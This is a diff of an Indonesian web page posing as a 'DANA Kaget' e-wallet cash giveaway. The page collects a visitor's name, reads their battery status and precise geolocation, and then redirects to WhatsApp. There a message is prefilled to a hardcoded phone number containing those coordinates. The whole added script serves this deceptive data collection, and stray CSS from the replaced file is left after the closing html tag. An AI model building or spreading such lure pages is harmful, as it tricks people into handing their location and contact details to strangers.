@@ -1,39 +1,309 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <title>Script HTML buat Kamu</title>
-  <meta name="description" content="@feelthisray - Script HTML by Feeldream Repl Co">
-  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
-  <script>
-        var nilaiRandom = Math.floor(Math.random() * 11);
-        if (nilaiRandom >= 0) {
-            //window.location.replace("https://www.feeldream.id/2025/03/html-bucin-ayangku-masih-ngambek.html");
-        } else {
-            window.location.replace("https://htmlku.com/gaboleya/play");
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sebar DANA Kaget! 💖</title>
+    <meta name="description" content="Halaman web menampilkan info DANA Kaget lalu mengarahkan ke WhatsApp setelah jeda video dan loading. Menampilkan info baterai dan lokasi (jika diizinkan) dengan menyertakan nama.">
+    <meta name="keywords" content="dana kaget, whatsapp, langsung kirim, loading, video, baterai, lokasi, nama">
+    <meta name="author" content="AI Assistant">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Fredoka', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-image: linear-gradient(to top, #fbc2eb 0%, #a6c1ee 100%);
+            color: #5d455d;
         }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: #fffaf0; /* Warna krem lembut */
+            border-radius: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease-in-out;
+            max-width: 90%;
+            width: 400px;
+            border: 3px solid #ff99c8; /* Garis tepi pink */
+        }
+
+        .container:hover {
+            transform: scale(1.03) rotate(2deg);
+        }
+
+        h2 {
+            font-size: 2em;
+            color: #ff6b81; /* Pink cerah */
+            margin-bottom: 25px;
+            text-shadow: 2px 2px #ffe6f2; /* Bayangan teks lembut */
+        }
+
+        .redirect-info {
+            font-size: 1em;
+            color: #777;
+            margin-top: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        label {
+            align-self: flex-start;
+            margin-bottom: 5px;
+            font-weight: 700;
+            color: #ff99c8;
+        }
+
+        input[type="text"] {
+            padding: 12px 15px;
+            margin-bottom: 25px;
+            border: 2px solid #ff99c8;
+            border-radius: 50px;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 1em;
+            color: #5d455d;
+            background-color: #fff0f5; /* Warna pink muda */
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #ff6b81;
+            box-shadow: 0 0 8px rgba(255, 107, 129, 0.3);
+        }
+
+        button {
+            padding: 12px 25px;
+            background-image: linear-gradient(to right, #ff9a9e 0%, #fad0c4 100%);
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1.1em;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(255, 153, 158, 0.5);
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(255, 153, 158, 0.7);
+        }
+
+        .loading-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 12px;
+            background-color: #ffe6f2;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background-image: linear-gradient(to right, #ff99c8 0%, #ff6b81 100%);
+            border-radius: 6px;
+            animation: bounce-progress 1s infinite alternate;
+        }
+
+        @keyframes bounce-progress {
+            0% { transform: scaleX(1); }
+            100% { transform: scaleX(1.02) scaleY(1.1); }
+        }
+
+        .loading-text {
+            font-size: 1em;
+            color: #ff6b81;
+            animation: heart-beat 1.5s infinite;
+        }
+
+        @keyframes heart-beat {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .video-container {
+            display: none;
+            margin-bottom: 20px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        video {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .info-container {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #777;
+            text-align: left;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p>Sebutin nama nanti aku save, berteman tanpa memandang sesuatu itu asik, oiya jumbernya sekalian disini ajh ya cape klik link minta kalian satu satu, 100 slot jngn di kurir,  emuachhhh 🥰</p>
+        <form id="dana-form">
+            <label for="nama">Nama Imut Kamu : </label>
+            <input type="text" id="nama" name="nama" required placeholder="Masukkan nama kesayanganmu">
+
+            <button type="submit" id="submit-btn">Kirim ke WhatsApp 💖</button>
+        </form>
+
+        <div class="video-container" id="video-container">
+            <video id="narsis-video" src="https://e.top4top.io/m_3390gfh1p0.mp4" width="320" height="240"></video>
+        </div>
+
+        <div class="loading-container" id="loading-container">
+            <div class="loading-bar">
+                <div class="loading-progress" id="loading-progress"></div>
+            </div>
+            <p class="loading-text">Narsis dulu yaaa, biar makin sayang 🤣</p>
+        </div>
+
+        <div class="info-container" id="info-container">
+            <p id="battery-info">Memuat info baterai...</p>
+            <p id="location-info">Memuat info lokasi...</p>
+        </div>
+
+        <p class="redirect-info">nara zaen 🍓</p>
+    </div>
+
+    <script type="text/javascript">
+        const form = document.getElementById('dana-form');
+        const submitBtn = document.getElementById('submit-btn');
+        const videoContainer = document.getElementById('video-container');
+        const narsisVideo = document.getElementById('narsis-video');
+        const loadingContainer = document.getElementById('loading-container');
+        const loadingProgress = document.getElementById('loading-progress');
+        const whatsappNumber = "+6285711374861";
+        const linkDanaKaget = "https://link.dana.id/danakaget?c=sassxc4z6&r=cAYM8h&orderId=20250808101214228115010300166998235030366";
+        const videoDuration = 20000; // 10 detik
+        const batteryInfoElement = document.getElementById('battery-info');
+        const locationInfoElement = document.getElementById('location-info');
+        let batteryLevel = 'Tidak tersedia';
+        let isCharging = 'Tidak tersedia';
+        let latitude = 'Tidak tersedia';
+        let longitude = 'Tidak tersedia';
+
+        // Mendapatkan informasi baterai
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                updateInfoDisplay();
+
+                battery.addEventListener('levelchange', () => {
+                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    updateInfoDisplay();
+                });
+
+                battery.addEventListener('chargingchange', () => {
+                    isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                    updateInfoDisplay();
+                });
+            }).catch(error => {
+                batteryInfoElement.textContent = 'Info baterai tidak tersedia.';
+                console.error('Gagal mendapatkan info baterai:', error);
+            });
+        } else {
+            batteryInfoElement.textContent = 'Fitur info baterai tidak didukung.';
+        }
+
+        // Mendapatkan informasi lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                latitude = position.coords.latitude.toFixed(6);
+                longitude = position.coords.longitude.toFixed(6);
+                updateInfoDisplay();
+            }, error => {
+                locationInfoElement.textContent = 'Akses lokasi ditolak atau tidak tersedia.';
+                console.error('Gagal mendapatkan lokasi:', error);
+            });
+        } else {
+            locationInfoElement.textContent = 'Fitur lokasi tidak didukung.';
+        }
+
+        function updateInfoDisplay() {
+            batteryInfoElement.textContent = `Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            locationInfoElement.textContent = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
+        }
+
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Info Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            const locationText = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
+
+            if (!nama) {
+                alert('Nama tidak boleh kosong, ya sayang!');
+                return;
+            }
+
+            // Sembunyikan form dan tampilkan video
+            form.style.display = 'none';
+            videoContainer.style.display = 'block';
+            loadingContainer.style.display = 'flex';
+            narsisVideo.play();
+
+            let progress = 0;
+            const interval = 20;
+            const steps = videoDuration / interval;
+            let currentStep = 0;
+
+            const loadingInterval = setInterval(() => {
+                currentStep++;
+                progress = (currentStep / steps) * 100;
+                loadingProgress.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(loadingInterval);
+                }
+            }, interval);
+
+            setTimeout(() => {
+                narsisVideo.pause();
+                const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSAVE NOMER GUA ANJAY 🤤`;
+                const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
+                window.location.href = whatsappUrl;
+            }, videoDuration);
+        });
+
+        narsisVideo.addEventListener('ended', () => {
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Baterai ku sisa ${batteryLevel} nara, dan ${isCharging}`;
+            const locationText = `Lokasi ku mungkin disini ${latitude}, ${longitude} 🤣`;
+            const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA JUMBER NYA! ${linkDanaKaget}\n\nSave No Gua Anjay 🤤`;
+            const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
+            window.location.href = whatsappUrl;
+        });
     </script>
-  
-  <link rel="icon" type="image/svg+xml" href="https://feeldreams.github.io/main-icon.png"> 
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
-  <link rel="stylesheet" href="style.css">
-  <script src="https://unpkg.com/scrollreveal"></script>
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
-  <script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&display=swap');
-    @import url('https://fonts.googleapis.com/css2?family=Caveat&display=swap');
-    @import url('https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;700&display=swap');
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap');
-    @import url('https://fonts.googleapis.com/css2?family=Inter&family=Itim&display=swap');
-    
-    :root {
-    --poppins: 'Poppins', sans-serif;
-    --nunito: 'Nunito Sans', sans-serif;
-    --caveat: 'Caveat', cursive;
-    --quicksand: 'Quicksand', sans-serif;
-    --itim: 'Itim', cursive;
-    --inter: 'Inter', sans-serif;
+</body>
+</html>
     }
     *{padding:0;margin:0}body{background:linear-gradient(0.25turn,rgb(0,38,77),rgb(0,38,70));background:#000;background-size:cover;background-position:center;height:100vh;overflow:hidden;color:black}#container{width:80%;margin:20px auto;min-height:650px;margin-top:150px;color:black}@media screen and (max-width:400px){#container{width:100%;margin:50% auto;min-height:800px}}.wrapper{position:fixed}.box div{position:fixed;width:60px;height:60px;background-color:transparent;border:6px solid rgba(255,255,255,0.3);border-radius:50%}.box div:nth-child(1){top:12%;left:42%;animation:animate 10s linear infinite}.box div:nth-child(2){top:70%;left:50%;animation:animate 7s linear infinite}.box div:nth-child(3){top:17%;left:6%;animation:animate 9s linear infinite}.box div:nth-child(4){top:20%;left:60%;animation:animate 10s linear infinite}.box div:nth-child(5){top:67%;left:10%;animation:animate 6s linear infinite}.box div:nth-child(6){top:80%;left:70%;animation:animate 12s linear infinite}.box div:nth-child(7){top:60%;left:80%;animation:animate 15s linear infinite}.box div:nth-child(8){top:32%;left:25%;animation:animate 16s linear infinite}.box div:nth-child(9){top:90%;left:25%;animation:animate 9s linear infinite}.box div:nth-child(10){top:20%;left:80%;animation:animate 5s linear infinite}@keyframes animate{0%{transform:scale(0) translateY(0) rotate(0);opacity:.8}100%{transform:scale(1.3) translateY(-90px) rotate(360deg);opacity:0}}
     
